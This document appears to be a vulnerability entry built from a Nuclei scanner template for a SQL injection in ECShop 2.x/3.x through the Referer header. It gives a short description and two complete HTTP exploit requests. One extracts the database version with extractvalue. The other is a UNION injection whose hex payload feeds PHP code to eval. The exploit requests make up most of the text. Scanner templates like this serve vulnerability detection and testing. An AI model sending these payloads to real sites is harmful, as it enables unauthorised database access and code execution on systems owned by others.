# Nuclei Template: ECShop 2.x/3.x - SQL Injection
**Template ID:** ecshop-sqli
**Vulnerability Class:** SQL Injection
**Severity:** Critical
**CWE:** CWE-89
**Source:** Nuclei Template (`ecshop-sqli.yaml`)

## Vulnerability Information & PoC

## Description
ECShop 2.x and 3.x contains a SQL injection vulnerability which can allow an attacker to inject arbitrary SQL statements via the referer header field and the dangerous eval function, thus possibly allowing an attacker to obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Steps to reproduce / Exploit Payload
```http
GET /user.php?act=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}

GET /user.php?act=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}554fcae493e564ee0dc75bdf2ebf94ca
```

## References
- https://titanwolf.org/Network/Articles/Article?AID=af15bee8-7afc-4bb2-9761-a7d61210b01a
- https://phishingkittracker.blogspot.com/2019/08/userphp-ecshop-sql-injection-2017.html
- http://www.wins21.com/mobile/blog/blog_view.html?num=1172
- https://www.shutingrz.com/post/ad_hack-ec_exploit/
